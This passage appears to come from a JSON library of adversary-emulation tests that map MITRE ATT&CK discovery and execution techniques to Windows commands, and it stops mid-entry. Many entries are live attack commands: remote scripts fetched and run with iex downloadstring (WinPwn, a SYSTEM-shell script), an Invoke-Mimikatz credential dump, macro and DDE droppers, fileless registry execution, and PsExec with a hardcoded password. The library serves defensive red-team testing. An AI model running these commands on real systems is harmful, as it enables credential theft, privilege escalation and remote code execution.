    "53b7fd7256549c9259d4f98f0a44d78b": {
        "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cscript d06deb_griffon_recon.vbs",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "d06deb_griffon_recon.vbs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "53b7fd7256549c9259d4f98f0a44d78b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f247309a5f934b32f2e510eb50409d3b": {
        "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net share",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f247309a5f934b32f2e510eb50409d3b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "01f95fd0213aeb1eb07fca8dc548f5ce": {
        "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Scanning"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); fruit -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "01f95fd0213aeb1eb07fca8dc548f5ce",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f5b4c02bae169cb3a62ac26bb80321d6": {
        "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-localgroup; Get-LocalGroupMember -Name \"Administrators\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f5b4c02bae169cb3a62ac26bb80321d6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1d48fc4147a7bcd47bdf60db7dde9640": {
        "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-Process",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1d48fc4147a7bcd47bdf60db7dde9640",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2b4e2a7be6ebda89812fe2d2f39f6173": {
        "description": "A list of commands known to be performed by Qakbot for recon purposes",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "64c4ae_qakbot.bat",
                    "payloads": [
                        "64c4ae_qakbot.bat"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "2b4e2a7be6ebda89812fe2d2f39f6173",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e6a9fe7e91030f05ad87b75ad4fd4a3a": {
        "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); winPEAS -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e6a9fe7e91030f05ad87b75ad4fd4a3a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f1cce45585d407e267443dc271d89931": {
        "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -Name \"procexp*\" -ErrorAction Ignore; Remove-Item \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\" -ErrorAction Ignore; Remove-Item \"$env:TEMP\\procexp.exe\" -ErrorAction Ignore",
                    "command": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"; $fname1 = \"$env:TEMP\\procexp.exe\"; if (Test-Path $fname) {;   Remove-Item $fname;   Remove-Item $fname1; }; $xlApp = New-Object -COMObject \"Excel.Application\"; $xlApp.Visible = $True; $xlApp.DisplayAlerts = $False; $xlBook = $xlApp.Workbooks.Add(); $sheet = $xlBook.Excel4MacroSheets.Add(); if (\"$env:Username\" -ne \"\") {;   $sheet.Cells.Item(1,1) = \"$env:Username\"; } else {;   $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"; }; $sheet.Cells.Item(2,1) = \"procexp.exe\"; $sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"; $sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"; $sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"; $sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"; $sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"; $sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"; $sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"; $sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"; $sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"; $sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"; $sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"; $sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"; $sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"; $sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"; $sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"; $sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"; $sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"; $sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"; $sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"; $sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"; $sheet.Cells.Item(23,1) = \"=HALT()\"; $sheet.Cells.Item(1,1).Name = \"runme\"; $xlApp.Run(\"runme\"); $xlApp.Quit(); [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null; [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null; [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers(); Remove-Variable xlBook; Remove-Variable xlApp",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f1cce45585d407e267443dc271d89931",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "31042444ef7e601d0f5650bc5ed32b44": {
        "description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n\n[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  \n[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1569.002",
            "name": "System Services: Service Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del C:\\art-marker.txt >nul 2>&1",
                    "command": "sc.exe create ARTService binPath= \"%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" && sc.exe start ARTService && sc.exe delete ARTService",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "31042444ef7e601d0f5650bc5ed32b44",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "424bc481ab003275752aad9c6b2d946a": {
        "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -name PotentiallyUnwanted; Remove-Item $env:TEMP/PotentiallyUnwanted.exe -ErrorAction Ignore",
                    "command": "Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe; & \"$env:TEMP/PotentiallyUnwanted.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "424bc481ab003275752aad9c6b2d946a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "91711bb1e9ad7268f211ad94afa4ccdb": {
        "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.003",
            "name": "Command and Scripting Interpreter: Windows Command Shell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\T1059.003_script.bat -Force -ErrorAction Ignore",
                    "command": "Start-Process $env:TEMP\\T1059.003_script.bat",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "91711bb1e9ad7268f211ad94afa4ccdb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d9f569d91554884ce195f36546a475a4": {
        "description": "Simulate Raspberry Robin using the \"standard-in\" command prompt feature cmd `/R <` to read and execute a file via cmd.exe\nSee https://redcanary.com/blog/raspberry-robin/. \n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.003",
            "name": "Command and Scripting Interpreter: Windows Command Shell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cmd /r cmd<07a87d_t1059.003_cmd.cmd",
                    "payloads": [
                        "07a87d_t1059.003_cmd.cmd"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "d9f569d91554884ce195f36546a475a4",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ae9ef01b8b55a7001139255811ba1d4f": {
        "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ae9ef01b8b55a7001139255811ba1d4f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e401dd1a8de06f4a52b66736c2050bb7": {
        "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1559.002",
            "name": "Inter-Process Communication: Dynamic Data Exchange"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "start 0a4081_DDE_Document.docx",
                    "payloads": [
                        "0a4081_DDE_Document.docx"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e401dd1a8de06f4a52b66736c2050bb7",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "591f5d57f5d87e3e0202fc46375c780d": {
        "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "591f5d57f5d87e3e0202fc46375c780d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "5114eef0155acf3f304e9780df2b548e": {
        "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.005",
            "name": "Command and Scripting Interpreter: Visual Basic"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:TEMP\\atomic_t1059_005_test_output.bin\" -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5114eef0155acf3f304e9780df2b548e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "98adc43648b0e4ea6e90a88ad5ae4b3d": {
        "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Stop-Process -name mshta",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "98adc43648b0e4ea6e90a88ad5ae4b3d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "06e2c4e84297011cff477a7a4370b645": {
        "description": "Uses cscript //E:jscript to download a file\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %TEMP%\\OSTapGet.js /F /Q >nul 2>&1",
                    "command": "echo var url = \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js && cscript //E:Jscript %TEMP%\\OSTapGet.js",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "06e2c4e84297011cff477a7a4370b645",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f6d9c3fbee5549837ea37ff933291656": {
        "description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1106",
            "name": "Native API"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f6d9c3fbee5549837ea37ff933291656",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d6f57d813245d0ec3940cb3c50ad2848": {
        "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"$(\"$env:temp\\art1204.bat\")`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c $bat_path `\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct Word",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d6f57d813245d0ec3940cb3c50ad2848",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "90c76bd616efee6d7c98dc6c1dcc6e99": {
        "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "90c76bd616efee6d7c98dc6c1dcc6e99",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "523898649ff03b6f6051b5f92f24e9c9": {
        "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore; Remove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore",
                    "command": "reg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"; iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "523898649ff03b6f6051b5f92f24e9c9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "645a5637236ed7052aa5fe68d7b5a65b": {
        "description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.003",
            "name": "Command and Scripting Interpreter: Windows Command Shell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "stop-process -name wordpad -force -erroraction silentlycontinue",
                    "command": "cmd /c \"for /l %x in (1,1,75) do start wordpad.exe /p $env:temp\\T1059_003note.txt\" | out-null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "645a5637236ed7052aa5fe68d7b5a65b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "491a6258d8063dd476af143d2cc3b055": {
        "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1569.002",
            "name": "System Services: Service Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\PSTools\\PsExec.exe \\\\localhost -u DOMAIN\\Administrator -p P@ssw0rd1 -accepteula \"C:\\Windows\\System32\\calc.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "491a6258d8063dd476af143d2cc3b055",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "a40a2e93cc2a0413982801a9323baad9": {
        "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1204.002",
            "name": "User Execution: Malicious File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Users\\Public\\art.jse -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a40a2e93cc2a0413982801a9323baad9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "dfdef9d6526e992043fd0209729e0bf8": {
        "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
